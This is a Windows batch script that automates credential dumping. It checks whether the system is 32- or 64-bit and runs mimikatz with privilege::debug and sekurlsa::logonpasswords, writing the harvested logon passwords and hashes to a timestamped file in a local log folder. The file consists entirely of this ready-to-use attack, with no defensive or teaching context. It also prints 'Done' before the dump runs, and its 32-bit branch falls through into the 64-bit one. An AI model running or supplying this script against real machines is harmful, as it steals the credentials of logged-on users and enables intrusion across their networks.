@echo off
if not exist log md log
set datevar=%date:~0,4%%date:~5,2%%date:~8,2%
set timevar=%time:~0,2%
if /i %timevar% LSS 10 (set timevar=0%time:~1,1%)
set timevar=%timevar%%time:~3,2%%time:~6,2%
if /i "%PROCESSOR_IDENTIFIER:~0,3%"=="X86" (goto win32) ELSE goto x64
pause
:win32
echo ##x32##
echo.
echo Done, Please check log folder and exit.
win32\mimikatz privilege::debug sekurlsa::logonpasswords >>log\%datevar%%timevar%.txt
:x64
echo ##x64##
echo.
echo Done, Please check log folder and exit.
x64\mimikatz privilege::debug sekurlsa::logonpasswords >>log\%datevar%%timevar%.txt